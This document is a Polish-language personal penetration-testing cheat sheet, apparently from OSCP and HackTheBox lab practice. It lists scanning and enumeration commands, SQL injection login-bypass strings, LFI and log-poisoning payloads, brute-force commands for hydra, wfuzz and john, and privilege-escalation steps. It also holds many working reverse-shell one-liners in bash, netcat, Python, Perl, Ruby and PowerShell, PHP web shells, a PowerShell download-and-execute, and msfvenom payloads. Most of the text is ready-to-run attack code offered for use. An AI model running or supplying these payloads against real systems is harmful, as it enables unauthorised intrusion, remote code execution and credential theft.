skanowanie:
	1)      root@kali:~/LABS# nmap -sV -T5 -F 10.11.1.115 --script banner
        	root@kali:~/LABS# nmap -sV -T5 -F 10.11.1.115 --script vuln

========================================================================================================================

ataki na web aplikacjie:
1) wiec "page source"   i koniecznie "nmap --script vuln"
2) dirbuster / gobuster  (jak z ssl to opcja -k) / nikto (najlepiej wszystkie po kolei ...) (rozne rozszrzenia plikow nie tylko php)
3) cewl i password atack 
4) joomle wordpres ( joomscan  wpscan)
	root@kali:~/Desktop/htb/10_10_10_150# joomscan --url http://10.10.10.150 -ec    // <- enumerate components  po tym adresm sa wersje joomla : http://10.10.10.150/administrator/manifests/files/joomla.xml
	root@kali:~/Desktop/htb/10_10_10_120# wpscan --url 10.10.10.120/wp/wordpress/
					      wpscan --url http://derpnstink.local/weblog/ -e u     //<- enumerate users

	root@kali:~/Desktop/htb/10_10_10_120# wpscan  -w /usr/share/wordlists/rockyou.txt --username human --url 10.10.10.120/wp/wordpress/
	wpscan --url 10.11.1.234 -P /usr/share/wordlists/rockyou.txt -U admin  
	wpscan --url http://10.10.10.88/webservices/wp -e ap --plugins-detection aggressive



	-

5) sql injection - sqlmap etc "(force-ssl"- jak z ssl), np:  (sqlmap -r login.req)

	get logint.req from burpsuite 
	get databeses 
		sqlmap -r /home/kali/butch_request --dbms mssql --dbs
	attack database "butch"
		sqlmap -r ./login.req --dbms mssql -D butch --dump
			ssl example : 	sqlmap -r login.req --force-ssl --dbms mysql --batch


	tom' or 1=1 LIMIT 1;#
	' or 1=1--
	<username>' OR 1=1--
	'OR '' = '	Allows authentication without a valid username.
	<username>'--
	' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
	'OR 1=1--
	single quote '

6) przejzyc czy w certyfikacie na https sa mailu lub uzytkownicy

7)  caly czas sprawdzaj czy odkryty plugin, aplikacja, system logowania ma swojego exploia w searchsploit albo w google. np jak nzawa "mercury" to w google:  "smtp mercury"

8) LFI/RFI        - nie zapomniej o "%00" na koncu adresu http://adrej/admin.php?ACS_path=http://192.168.119.143:443/test.php%00  - pamietaj tym na koncu adresu
			LFI - no np mozna php filter:  192.168.0.75/?page=php://filter/convert.base64-encode/resource=config  
							try burp
						       10.10.10.151/blog/?lang=/windows/system.ini   or  10.10.10.151/blog/?lang=../../../../../windows/system.ini   
							probowac burp na windowsie na port 445 bo to smb i domyslnie mozna np GET /blog/?lang=//10.10.14.13/test

9) burp - na kazdej postronie ktorej cos sie dzieje, i tez zmienicaj GET na POST (wtedy trzeba podac jakies dane)

10) sprawdz zawsze wersje php czy podatna na shell shock (czy sa pliki cgi) i wersje apacha

11) atak na put , spradz opcje:  OPTIONS / HTTP/1.1

12) re-use password, uzyj posiadanych hasle w innych miejscach

13) jak jest cokolwiek o "file does not exist" to postawic na adresie np : http://192.168.0.31/manage.php?file=../../../../../../etc/passwd

14) jak "you don't have permisions" , to moze warto zmienic przez burpa:
X-Forwarded-For: 127.0.0.1
======================================================================================================================
======================================================================================================================
Atak na windows:

smb : 
	proba polaczenia (czasem smbmap nie dziala) :
		┌──(kali㉿kali)-[~/Desktop]
		└─$ smbclient -L  \\\\192.168.120.55 
		Enter WORKGROUP\kali's password: 

	        Sharename       Type      Comment
	        ---------       ----      -------
	        IPC$            IPC       Remote IPC
	        Shenzi          Disk      
		SMB1 disabled -- no workgroup available

	jak cos jest to sie lacze ze tym co tam jest np bez hasla:
		┌──(kali㉿kali)-[~/Desktop]
		└─$ smbclient  \\\\192.168.120.55\\Shenzi
		Enter WORKGROUP\kali's password: 
		Try "help" to get a list of possible commands.
		smb: \> ls


SQL Windows:
	Microsoft SQL Server
		sqsh -S 192.168.154.70:1435 -U sa -P EjectFrailtyThorn425
		albo
		/usr/share/doc/python3-impacket/examples/mssqlclient.py -port 1435  sa:EjectFrailtyThorn425@192.168.154.70
		
		
NTLM:
	czekanie na hashe:
		$ sudo responder -I tun0 

	evil-winrm:
		┌──(kali㉿kali)-[~/Desktop/PGLab/tryHArder/Heist]
		└─$ evil-winrm -i 192.168.52.165 -u enox -p california
		
	pth-winexe:
		pth-winexe -U <domain/username>%<hash> //<targetIP> cmd.exe 	

======================================================================================================================
======================================================================================================================
password attack on http :

przechwycic burpem zapytanie:

 linijka z burpa:
 username=FUZZ&passwd=Curling2018!&option=com_login&task=login&return=aW5kZXgucGhw&6bbc966118488be586d92079c8a6a264=1
 cookie= c0548020854924e0aecd05ed9f5b672b=crdnipktabk1qnvekjhhft8r5p; 99fb082d992a92668ce87e5540bd20fa=8jsqlq6bhorsmukclcgi5j13t3

(FUZZ to zmianna ktora zmienia to co jest podani tutaj username, haslo jest znane i to jest Curling2018  , '-hc' (high code) wyswitlie tylko niektore wynik / hw - hide words, aby nie wyswitlal wyrazow ktore wysyla)

root@kali:~/Desktop/htb/10_10_10_150# wfuzz --hc 200 -w wordCewl.txt -d 'username=FUZZ&passwd=Curling2018!&option=com_login&task=login&return=aW5kZXgucGhw&6bbc966118488be586d92079c8a6a264=1' -c  -b 'MoodleSession=fjr1ouagslsk9d8nu4sj3l4ks0' http://10.10.10.150/administrator/index.php

					wfuzz -c -w /usr/share/seclist/names.txt -d "username=FUZZ%password=SomePassword" --hs "No account found." http://10.10.10.97/login.php
		szukanie subdomen	sudo wfuzz -c -f sub-fighter.txt -Z -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --sc 200 -u 'http://devzat.htb/'  -H "Host:FUZZ.devzat.htb"

skanowanie uzytkownikow:
					 wfuzz -c -z file,names.txt --hw 657 -d "username=FUZZ&password=PleasSubscribe" http://10.10.10.73/login.php

Basic http password attack (na base64):
hydra -l test -P /usr/share/wordlists/rockyou.txt  http-get://10.11.1.237/webdav/

	sprawdz czy inne hasla nie maja schematu np: "aaaa1111" i "bbbb2222"
	generowanie hasle przez "cewl" ale i "crunch"
						- crunch 4 6 0123456789ABCDE -o crunch.txt
		file_character_Set:		- crunch 4 6 -f /usr/share/crunch/charset.lst mixalpha -o crunch.txt 
	
	Cewl example (czyli do wordlisty wziecie ze strone roznych hasel ):
		kali@kali:~$ cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt
		kali@kali:~$ grep Nano megacorp-cewl.txt
		Nanotechnology
		Nanomite
		Nanoprobe
		Nanoprocessors
		NanoTimes
		Nanobot

			aby dodac numerki na konice hasel to mozja tool-e, johny:
				kali@kali:~$ sudo nano /etc/john/john.conf
				...
				# Wordlist mode rules
				[List.Rules:Wordlist]
				# Try words as they are
				:
				# Lowercase every pure alphanumeric word
				-c >3 !?X l Q
				# Capitalize every pure alphanumeric word
				-c (?a >2 !?X c Q
				# Lowercase and pluralize pure alphabetic words
				...
				# Try the second half of split passwords
				-s x_
				-s-c x_ M l Q
				# Add two numbers to the end of each password
				$[0-9]$[0-9]

			i uruchomienie:
				kali@kali:~$ john --wordlist=megacorp-cewl.txt --rules --stdout > mutated.txt
				Press 'q' or Ctrl-C to abort, almost any other key for status
				46446p 0:00:00:00 100.00% (2018-03-01 15:41) 663514p/s chocolate99
				kali@kali:~$ grep Nanobot mutated.txt
				...
				Nanobot90
				Nanobot91
				Nanobot92
		
				lub np:
					┌──(kali㉿kali)-[~/Desktop/htb_connectionEtc/10_10_11_104]
					└─$ john -format=md5crypt-long --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

				
		hackikng rdpp:
			kali@kali:~$ crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1


		ssh brute force:
			kali@kali:~$ hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
			ciekwae slowniki: /usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt
					  /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
		http post attack:

				kali@kali:~$ hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
========================================================================================
root@kali:~/Desktop/htb/10_10_10_150# cewl -d 4 -w wordCewl.txt http://10.10.10.150
root@kali:~/Desktop/0#cewl www.megacorpone.com -m 6 -w megacorp.txt
========================================================================================
root@kali:~/Desktop/htb# gobuster dir -u http://10.10.10.91:5000 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o gobuster.out

┌──(kali㉿kali)-[~/Desktop]
└─$ gobuster dir -u http://192.168.41.119:8080 -s "200" -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -x php,html,htm

   gobuster dir -u http://192.168.85.52 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -k -x .txt,.php --threads 100

 dirb http://192.168.0.157 /usr/share/wordlists/dirb/big.txt 
 dirb http://192.168.208.82/  -X .txt,.log,.php,.html,.zip,.gz,.tar,.gz,.sql,.bak,.conf,.cnf,.sh,.py,.perl 

┌──(kali㉿kali)-[~/Desktop]
└─$ curl -v 192.168.198.62:8000

try to upload file:
 [ .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .phar and .inc  ".htaccess" ]

========================================================================================
IMAP port 143:
	ncat 10.10.10.120 443
	login [tutaj username] [tutajpassword]


========================================================================================
a)
kozystanie z klucza w ssh:


root@kali:~/Desktop/htb/10_10_10_91# chmod 600 roosa.key 
root@kali:~/Desktop/htb/10_10_10_91# ssh -i roosa.key roosa@10.10.10.91

root@kali:~# ssh -i ./safe user@10.10.10.147

┌──(kali㉿kali)-[~/Desktop]
└─$ ssh seppuku@192.168.163.90 -t "bash --noprofile"

b) create key:

	┌──(kali㉿kali)-[~/Desktop/ProvingGrounds/GetToWork/Fail]
	└─$ ssh -i ./ssh/id_rsa fox@192.168.176.126

cp ./ssh/id_rsa.pub ./.ssh/authorized_keys

c) upload to remote 
	rsync -r ./.ssh/ rsync://192.168.176.126/fox/.ssh
d) permisions:
	chmod 600 ./ssh/id_rsa
e) connect:
ssh -i ./ssh/id_rsa fox@192.168.176.126

========================================================================================

python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'

export TERM=xterm 

(stty raw -echo && fg)
stty rows 46 
stty columns 171 


========================================================================================

Eskalacja uprawnien:
	-python linuxprivchecker.py 
	-LinEnum
	-pspy - z githuba - program obserwuje czy jakis proces nie uruchamia sie np z crona i widac ze jakis plik sie odpala i widamo ze mozna go szukac

	-ls | grep config     <- szukam plikow konfiguracji bazy danych,  ale lepiej rekursywnie :) a nie tak 
	-ls -R | grep config     - poszukaj tez jakis database.php etc aby byly tam crudentiale

	-ls /etc/cron.*

	-plik konfiguracyjny wp-config.php - tam sa hasla dla uzytkownikow, mozna sie zalogowac do wordpresa i eskalowac
			/var/www/html/wordpress/wp-config.php

	-https://gtfobins.github.io/      - tu sa jak suid wykozystac


	-gibson@alpha:~$ sudo -l

				graham@dc-6:/home/jens$ sudo -l
					....
    				(jens) NOPASSWD: /home/jens/backups.sh
				graham@dc-6:/home/jens$ sudo -u jens ./backups.sh


	-gibson@alpha:~$ sudo su 

	-  cat etc/crontab


	- gtfobins.github.io

	- find /  -perm -u=s -type f 2>/dev/null
	- find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null (finding writable files)

	- sprawdzaj pliki w www/html (tam czesto haslo): 
					www-data@falafel:/var/www/html$ cat connection.php


	-jesli jest suid bash to mozna:	
		bash-5.0$ /usr/bin/bash -p

	- ps -aux | grep root    - mozna wpisac



na windowsie xp szukanie plikow
	C:\>dir /s rev_tcp.asp
	accesschk.exe    <- chyba tylko na windosa xp 


	- docker run -it -v /:/mnt alpine chroot /mnt


	- certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe

	- jak sie zalogujesz to :
				> systeminfo
	- sprawdzaj pliki w www/html (tam czesto haslo): 
					www-data@falafel:/var/www/html$ cat connection.php

	- stary windows:
	na kalim:
		 sudo impacket-smbserver smb smb  
	na windowsie exploit albo nc.exe:
		C:\wmpub\wmiislog>copy \\10.10.14.6\smb\churrasco.exe
				 >copy \\10.10.14.6\smb\nc.exe

	plik reverse shell na windows: rev_shell.ps1:
	$client = New-Object System.Net.Sockets.TCPClient("10.10.14.6",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()


sciaga i zapisuje plik z kali na windows (plik rev_shell.ps1):
	<%
	Set s = CreateObject("WScript.Shell")
	Set cmd = s.Exec("cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.6:80/rev_shell.ps1')")
	o = cmd.StdOut.Readall()
	Response.write(o)
	%>


winpeas / powerUp
	/home/kali/Desktop/opt/windowsEscalation/winPEASx86.exe
	/usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1



PS C:\Users\rupert\Downloads> Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
PS C:\Users\rupert\Downloads> Import-Module (Resolve-Path('PowerUp.ps1'))
Import-Module (Resolve-Path('PowerUp.ps1'))
PS C:\Users\rupert\Downloads> 	
	
========================================================================================
(wykrycie ze ktos cie pinguje:) 
tcpdump -i tun0 icmp

========================================================================================
MYSQL:
	samego siebie odpytac: mysql -u root -D dataBAseName -p
	kogos: mysql -h 192.168.0.75 -u root -p  

specyficzna skladnia:
	mysql -h 192.168.134.29 -u root -p  Users
	mysql -h 192.168.134.29 -u root -p  

działanie lokalne i przykladem bazy fanych 'suitecrm' i tabla 'users' na lokalnej maszynie , z mozliwoscia loginu bez hasla
	mysql -uroot -P 
	mysql> show databases;
	mysql> use suitecrm;
	mysql> showtables
	mysql> select * from users

========================================================================================
PHP:
np morzesz stworzyc plik php :

<?php system($_REQUEST['AndComment']); ?>
<?php echo system($_GET[“cmd”]); ?>”

i jak jest adress tego php to mozesz np: http://127.0.0.1/h.php?AndComment=whoami

w burpie: 
	GET http://127.0.0.1/h.php&AndComment=whoami

========================================================================================
FTP: change to binary mode to download
	ftp 10.10.10.98
	...
	Name (10.10.10.98:kali): anonymous
	331 Anonymous access allowed, send identity (e-mail name) as password.
	Password: 
	230 User logged in.
	Remote system type is Windows_NT.
	ftp> 

or
weget -m ftp://anonymous:anonymous@10.10.10.98 
if "cannot inititate PASV tranfer":
weget -m --no-passive ftp://anonymous:anonymous@10.10.10.98 

========================================================================================
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
----------------------------------------------------------------------
webpage reverseh shell:  https://www.revshells.com/

php reverse shell for windows:
		https://github.com/WhiteWinterWolf/wwwolf-php-webshell

bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
bash -i >& /dev/tcp/192.168.119.143/4444 0>&1
czasem:
	 echo 'bash -i >& /dev/tcp/192.168.49.141/443 0>&1' | bash
nc bez "-e"
	mknod /tmp/backpipe p
	/bin/sh 0</tmp/backpipe | nc 192.168.49.141 4444 1>/tmp/backpipe

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

nc -e /bin/sh 10.0.0.1 1234

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f


r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

xterm -display 10.0.0.1:1
To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):
Xnest :1
You’ll need to authorise the target to connect to you (command also run on your host):
xhost +targetip



aspx extra info:

msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx

listen on msf:
	└─$ msfconsole -q
	msf6 > use exploit/multi/handler 
	[*] Using configured payload generic/shell_reverse_tcp
	msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp 
	payload => windows/meterpreter/reverse_tcp
	msf6 exploit(multi/handler) > set lhost 10.10.14.22
	lhost => 10.10.14.22
	msf6 exploit(multi/handler) > set lport 4444
	lport => 4444
	msf6 exploit(multi/handler) > run


msfvenom dla nc:
	msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.249 LPORT=1234 -f elf > shell.bin

php revShell for windows:
	https://www.puckiestyle.nl/windows-php-reverse-shell/

powershell download and execute 
	 IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/RevShell.ps1')   <- in burp change to web (ctr U)
	 in burp : powershell+IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/RevShell.ps1')

======================================================================================================================================

UWAGI Extra:

jak jestes na reverse shell to mozesz miec tab i histori i strzalki:
- python3 -c 'import pty;pty.spawn("/bin/bash")'
- ctrl Z - wchodzi w to : (-www-data@curling:/home/floris$ ^Z)
- wpisc: stty raw -echo  (root@kali:~/Desktop/htb/10_10_10_150# stty raw -echo)
- f+g+ENTER 
- ENTER (i gotowe)

export TERM=xterm
--------------------------------------------------------------------------------------------------------------------
jest taki tool do rpzakowywania/rozkodowywania :
CyberCheff: 
	https://gchq.github.io/CyberChef/

=======================================================================================================================================
power shell reverse shell:

C:\Users\offsec> powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.
11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =
$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.T
ext.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII
).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$c
lient.Close()"

=======================================================================================================================================

──(kali㉿kali)-[~/Desktop]
└─$ rpcinfo 10.11.1.115                                                                                    
   program version netid     address                service    owner
    100000    2    tcp       0.0.0.0.0.111          portmapper unknown
    100000    2    udp       0.0.0.0.0.111          portmapper unknown
    100024    1    udp       0.0.0.0.128.0          status     unknown
    100024    1    tcp       0.0.0.0.128.0          status     unknown
    391002    2    tcp       0.0.0.0.128.1          sgi_fam    unknown
                                                                                                                 
┌──(kali㉿kali)-[~/Desktop]
└─$ rpcinfo -p 10.11.1.115

=======================================================================================================================================

kali download:
┌──(kali㉿kali)-[~/Desktop/exercisesPdf/clienSideAttack_13/str_436]
└─$ sudo nc -nvlp 4455 > ./MacroRevShell.doc                                                                 
listening on [any] 4455 ...
connect to [192.168.119.143] from (UNKNOWN) [192.168.143.10] 57226

Windows sending file:
	C:\> nc.exe -w 3 192.168.119.143 4455 < "C:\Users\Administrator\Desktop\MacroRevShell.doc"


=======================================================================================================================================
 wysylam zapytanie zgodnie z esploitem (burpie):

	OPTIONS / HTTP/1.1
	Content-Length: 0
	Host: 10.11.1.115
	User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0



PUT /file.txt HTTP/1.1
Content-Type: text/plain
Content-Length:26

<? passthru($_GET[cmd]) ?>


---------------------------------------------------------------------------------------------------------------------------------------
mozna cURL:
	┌──(kali㉿kali)-[~/Desktop/htb_connectionEtc/10_10_10_15]
	└─$ curl -X PUT 10.10.10.15/reverse.txt -d @reverse.txt  
albo jako binady data:
	curl -X PUT 10.10.10.15/reverse.txt --data-binary @reverse.txt 
albo move:
	curl -X MOVE -H 'Destination:http://10.10.10.15/reverse.aspx' http://10.10.10.15/reverse.txt


=======================================================================================================================================
HYDRA Exaples from htb:
──(kali㉿kali)-[~/Desktop]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 -V http-post-form  "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64

https:
z burpa:
password=password1234&remember=yes&login=Log+In&proc_login=true

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 -V https-post-form  "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect" -t 64

==============================================================================================================================================================================================================================================================================
==============================================================================================================================================================================================================================================================================

┌──(kali㉿kali)-[~/Desktop]
└─$ smbclient //192.168.0.87/kathy -U Harry                                                                                                                            130 ⨯
Enter WORKGROUP\Harry's password: 
Try "help" to get a list of possible commands.
smb: \> ls


┌──(kali㉿kali)-[~/Desktop/vulnHub/Photographer]
└─$ smbclient //192.168.0.221/sambashare                                                                                                                               130 ⨯
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> ls



┌──(kali㉿kali)-[~/Desktop/vulnHub/symfonus2]
└─$ smbmap -R -H  192.168.0.223

┌──(kali㉿kali)-[~/Desktop/vulnHub/symfonus2]
└─$ smbclient //192.168.0.223/anonymous  -U anonymous 

┌──(kali㉿kali)-[~/Desktop/vulnHub/8_MRCY]
└─$ smbclient \\\\192.168.0.216\\qiu -U qiu  

albo file manager i w oknie sciezki wpisac:
	smb://192.168.0.223/anonymous/backups/
 
==============================================================================================================================================================================================================================================================================
==============================================================================================================================================================================================================================================================================
if i have some file : .git

┌──(kali㉿kali)-[~/Desktop/opt/git-dumper/git-dumper]
└─$ bash ./gitdumper.sh  http://192.168.0.157/.git/ ./../../../vulnHub/devGuru/devguru  


┌──(kali㉿kali)-[~/Desktop/opt/git_extractor]
└─$ ./extractor.sh ../../vulnHub/devGuru/devguru ../../vulnHub/devGuru/devguru/gitExtract

==============================================================================================================================================================================================================================================================================
==============================================================================================================================================================================================================================================================================

Magic Words:
*.gif:
	GIF98
	<?php
....

==============================================================================================================================================================================================================================================================================
==============================================================================================================================================================================================================================================================================
change path:

kane@pwnlab:/tmp$ echo /bin/bash >> cat
echo /bin/bash >> cat
kane@pwnlab:/tmp$ cat cat
cat cat
/bin/bash
kane@pwnlab:/tmp$ chmod +x /tmp/cat
chmod +x /tmp/cat
kane@pwnlab:/tmp$ export PATH=/tmp:$PATH
export PATH=/tmp:$PATH
kane@pwnlab:/tmp$ ~/msgmike
==============================================================================================================================================================================================================================================================================
==============================================================================================================================================================================================================================================================================
jak mozesz directory traversal to wysylasz do logow cos takiego (log poison):

Mozilla/5.0 <?php system($_GET['cmd']); ?> Gecko/20100101 Firefox/68.0

i wejsc w logi aby to uruchomic:

wget "192.168.56.121:8593/index.php?book=../../../../../var/log/apache2/access.log&cmd=metasploit command went here

